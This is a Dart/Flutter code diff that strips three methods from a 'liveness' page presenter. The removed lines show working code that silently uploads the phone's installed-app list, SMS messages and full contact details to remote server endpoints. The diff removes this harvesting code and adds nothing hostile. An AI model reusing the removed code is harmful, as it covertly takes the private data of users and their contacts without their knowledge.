@@ -1,7 +1,7 @@
 import 'dart:convert';
 
-import 'package:appcheck/appcheck.dart';
-import 'package:flutter_contacts/flutter_contacts.dart';
+// import 'package:appcheck/appcheck.dart';
+// import 'package:flutter_contacts/flutter_contacts.dart';
 import 'package:dio/dio.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
@@ -87,129 +87,17 @@ class LivenessPagePresenter extends BasePagePresenter<LivenessIMvpView> {
   }
 
   Future<void> getApps() async {
-    int lastAppUploadTIme = SpUtil.getInt(Constant.tLastAppTime) ?? 0;
-    DateTime now = DateTime.now();
-    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
-    if (!(lastAppUploadTIme == 0 || timestamp - lastAppUploadTIme > 3600 * 1000)) {
-      return;
-    }
-    final appCheck = AppCheck();
-    List<AppInfo>? installedApps;
-    installedApps = await appCheck.getInstalledApps();
-    List<AppInfo>? installedApps2;
-    List<Map<String, dynamic>> appMaps = [];
 
-    // debugPrint(installedApps.toString());
-    installedApps?.sort(
-      (a, b) => a.appName!.toLowerCase().compareTo(b.appName!.toLowerCase()),
-    );
-    installedApps2 = installedApps?.where((element) => !element.isSystemApp!).toList();
-    installedApps?.map((e) => print(e.appName!.toLowerCase()));
-    for (AppInfo appOne in installedApps2!) {
-      Map<String, dynamic> data = <String, dynamic>{};
-      data['appName'] = appOne.appName;
-      data['packageName'] = appOne.packageName;
-      data['versionName'] = appOne.versionName;
-      data['isSystemApp'] = appOne.isSystemApp;
-      appMaps.add(data);
-    }
-    Map<String, dynamic> FormDataMap = {};
-    FormDataMap['messages'] = jsonEncode(appMaps);
-    FormData formData = FormData.fromMap(FormDataMap);
-    var isShowDialog = false;
-    requestNetwork<dynamic>(Method.post, url: HttpApi.sAApp, params: formData, isShow: isShowDialog, onSuccess: (data) {
-      DateTime now = DateTime.now();
-      int timestamp = now.millisecondsSinceEpoch;
-      SpUtil.putInt(Constant.tLastAppTime, timestamp ~/ 1000);
-      if (data != null) {}
-    }, onError: (_, __) {
-      /// 加载失败
-    });
   }
 
   Future<void> r() async {
-    int lastSmsUploadTIme = SpUtil.getInt(Constant.nLastMsgTime) ?? 0;
-    DateTime now = DateTime.now();
-    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
-    if (!(lastSmsUploadTIme == 0 || timestamp - lastSmsUploadTIme > 3600 * 1000)) {
-      return;
-    }
-    Map<String, dynamic>? params = {"id": 1};
-    await requestNetwork<dynamic>(Method.get, url: '${HttpApi.nUserProfile}/1', queryParameters: params, isShow: false, onSuccess: (data) async {
-      bool permission = await view.requestPermission('sms');
-      Map<String, dynamic> FormDataMap = {};
-      if (permission) {
-        Map<String, dynamic> arguments = <String, dynamic>{
-          'start': DateTime.parse(data['data']['n_last_msg_time'] as String).millisecondsSinceEpoch,
-        };
-        final List<dynamic> messages = await platform.invokeMethod('getSmsList', arguments) as List;
-        messages.forEach((element) {});
-        FormDataMap['messages'] = jsonEncode(messages);
-      }
-      FormData formData = FormData.fromMap(FormDataMap);
-      var isShowDialog = false;
-      requestNetwork<dynamic>(Method.post, url: HttpApi.rCSms, params: formData, isShow: isShowDialog, onSuccess: (data) {
-        DateTime now = DateTime.now();
-        int timestamp = now.millisecondsSinceEpoch;
-        SpUtil.putInt(Constant.nLastMsgTime, timestamp ~/ 1000);
-        if (data != null) {}
-      }, onError: (_, __) {
-        /// 加载失败
-      });
-    }, onError: (_, __) {
-      /// 加载失败
-    });
+
   }
 
   Future<void> getContacts() async {
-    int lastContactUploadTIme = SpUtil.getInt(Constant.wLastContactTime) ?? 0;
-    DateTime now = DateTime.now();
-    int timestamp = now.millisecondsSinceEpoch ~/ 1000;
-    if (!(lastContactUploadTIme == 0 || timestamp - lastContactUploadTIme > 3600 * 1000)) {
-      // return;
-    }
 
-    if (await view.requestPermission('contacts')) {
-      if (await FlutterContacts.requestPermission()) {
-        List<Contact> contacts = await FlutterContacts.getContacts();
-
-        // Get all contacts (fully fetched)
-        contacts = await FlutterContacts.getContacts(
-            withProperties: true, withPhoto: true);
-        Map<String, dynamic> FormDataMap = {};
-        List<Map<String, dynamic>> contactMaps = [];
-        for (Contact contact in contacts) {
-          for (Phone phone in contact.phones!) {
-            Map<String, dynamic> data = <String, dynamic>{};
-            data['phoneValue'] = phone.number;
-            data['phoneLabel'] = phone.label.toString();
-            data['identifier'] = contact.id;
-            data['displayName'] = contact.displayName;
-            data['givenName'] = contact.name.first;
-            data['middleName'] = contact.name.middle;
-            data['familyName'] = contact.name.last;
-            data['prefix'] = contact.name.prefix;
-            data['suffix'] = contact.name.suffix;
-            data['company'] = contact.organizations.first.company;
-            data['jobTitle'] = contact.organizations.first.title;
-            contactMaps.add(data);
-          }
-        }
-        FormDataMap['messages'] = jsonEncode(contactMaps);
-        FormData formData = FormData.fromMap(FormDataMap);
-        var isShowDialog = false;
-        requestNetwork<dynamic>(Method.post, url: HttpApi.bJContacts, params: formData, isShow: isShowDialog, onSuccess: (data) {
-          DateTime now = DateTime.now();
-          int timestamp = now.millisecondsSinceEpoch;
-          SpUtil.putInt(Constant.wLastContactTime, timestamp ~/ 1000);
-          if (data != null) {}
-        }, onError: (_, __) {
-          /// 加载失败
-        });
-      }
       // Get all contacts on device
 
 
-    }
   }
 }
